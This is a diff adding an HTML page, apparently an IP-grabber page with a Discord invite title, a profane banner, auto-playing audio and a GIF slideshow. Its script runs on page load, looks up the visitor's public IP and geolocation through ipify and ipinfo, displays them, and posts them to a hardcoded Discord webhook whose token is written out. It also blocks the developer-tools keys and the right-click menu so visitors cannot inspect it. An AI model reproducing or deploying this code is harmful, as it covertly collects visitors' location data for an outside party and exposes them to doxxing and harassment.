@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>discord.gg/llllllll</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', Courier, monospace;
+            color: #ff0000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+
+    /* إطار الجيف */
+    .gif-frame {
+        width: 900px;
+        height: 450px;
+        border-radius: 20px;
+        border: 3px solid #ff0000;
+        box-shadow: 
+            0 0 25px #ff0000,
+            0 0 55px rgba(255, 0, 0, 0.7),
+            inset 0 0 25px rgba(255, 0, 0, 0.3);
+        overflow: hidden;
+        margin-top: 40px;
+    }
+
+    /* كل صورة */
+    .mySlides {
+        display: none;
+        width: 100%;
+        height: 100%;
+    }
+
+    /* الجيف داخل الإطار */
+    .mySlides img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        filter: none !important;  /* بدون ضباب */
+        opacity: 1 !important;
+    }
+
+    /* الانتقال */
+    .fade {
+        animation-name: fade;
+        animation-duration: 0.3s;
+    }
+
+    @keyframes fade {
+        from { opacity: 0.2; }
+        to { opacity: 1; }
+    }
+
+    .text {
+        margin-top: 25px;
+        font-size: 3em;
+        color: #ff1d1d;
+        text-shadow: 0px 0px 8px #ff1212, 0px 0px 15px #fb1111, 0px 0px 25px #ff1111;
+        letter-spacing: 4.5px;
+    }
+
+    .info {
+        margin-top: 30px;
+        font-size: 1.4em;
+        color: #ff0000;
+        text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000;
+        white-space: pre-wrap;
+    }
+    </style>
+</head>
+<body>
+
+<div class="top-bar"></div>
+
+<div class="gif-frame">
+    <div class="mySlides fade"><img src="1.gif"></div>
+    <div class="mySlides fade"><img src="2.gif"></div>
+    <div class="mySlides fade"><img src="3.gif"></div>
+    <div class="mySlides fade"><img src="4.gif"></div>
+    <div class="mySlides fade"><img src="5.gif"></div>
+    <div class="mySlides fade"><img src="6.gif"></div>
+    <div class="mySlides fade"><img src="7.gif"></div>
+    <div class="mySlides fade"><img src="8.gif"></div>
+    <div class="mySlides fade"><img src="9.gif"></div>
+    <div class="mySlides fade"><img src="10.gif"></div>
+    <div class="mySlides fade"><img src="11.gif"></div>
+    <div class="mySlides fade"><img src="12.gif"></div>
+    <div class="mySlides fade"><img src="13.gif"></div>
+    <div class="mySlides fade"><img src="14.gif"></div>
+    <div class="mySlides fade"><img src="15.gif"></div>
+    <div class="mySlides fade"><img src="16.gif"></div>
+    <div class="mySlides fade"><img src="17.gif"></div>
+    <div class="mySlides fade"><img src="18.gif"></div>
+    <div class="mySlides fade"><img src="19.gif"></div>
+    <div class="mySlides fade"><img src="20.gif"></div>
+    <div class="mySlides fade"><img src="21.gif"></div>
+    <div class="mySlides fade"><img src="22.gif"></div>
+    <div class="mySlides fade"><img src="23.gif"></div>
+    <div class="mySlides fade"><img src="24.gif"></div>
+    <div class="mySlides fade"><img src="25.gif"></div>
+    <div class="mySlides fade"><img src="26.gif"></div>
+    <div class="mySlides fade"><img src="27.gif"></div>
+    <div class="mySlides fade"><img src="28.gif"></div>
+</div>
+
+<audio id="bg-music" autoplay loop>
+  <source src="aa.mp3" type="audio/mpeg">
+</audio>
+
+<div class="text">⁓Fuck you⁓</div>
+
+<div class="info" id="ip-info">Loading...</div>
+
+<div class="text"> : bo7md OP : discord.gg/llllllll</div>
+
+<script>
+let slideIndex = 0;
+showSlides();
+
+function showSlides() {
+    let slides = document.getElementsByClassName("mySlides");
+
+    for (let i = 0; i < slides.length; i++) {
+        slides[i].style.display = "none";
+    }
+
+    slideIndex++;
+    if (slideIndex > slides.length) { slideIndex = 1 }
+
+    slides[slideIndex - 1].style.display = "block";
+
+    setTimeout(showSlides, 150); // سرعة التنقل بين الجيف
+}
+
+fetch('https://ipinfo.io/json')
+.then(response => response.json())
+.then(data => {
+    delete data.readme;
+    document.getElementById('ip-info').textContent =
+        JSON.stringify(data, null, 2);
+});
+
+  // === منع فحص الصفحة (F12) ومفاتيح الاختصار ===
+  document.onkeydown = function(e) {
+    if (e.keyCode == 123) return false;
+    if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+    if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
+    if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+    if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+  };
+
+  // === منع قائمة الكليك يمين (context menu) ===
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+  });
+
+  // === إرسال IP إلى ويب هوك + عرض معلومات ipinfo ===
+  window.onload = function() {
+    fetch("https://api64.ipify.org?format=json")
+      .then(r => r.json())
+      .then(ipData => {
+        const ip = ipData.ip;
+        fetch('https://ipinfo.io/json')
+          .then(r => r.json())
+          .then(info => {
+            delete info.readme;
+            info.ip = ip;
+            document.getElementById('ip-info').textContent = JSON.stringify(info, null, 2);
+            // إرسال المعلومات إلى الويب هوك
+            const webhookURL = "https://canary.discord.com/api/webhooks/1406835678381215875/fvpexHZCIFXoEheK0iMv_dE9Bq9gt0hWuJnyv7hG4JrORkGoSMoqCalKEyagRdymQIJu";
+            fetch(webhookURL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ content: "🧠 Visitor Info:\n```json\n" + JSON.stringify(info, null, 2) + "\n```" })
+            });
+          });
+      });
+  };
+  document.body.addEventListener("click", function() {
+    const audio = document.getElementById("bg-music");
+    audio.volume = 1.0;
+    audio.play().catch(() => {});
+}, { once: true });
+
+</script>
+
+</body>
+</html>
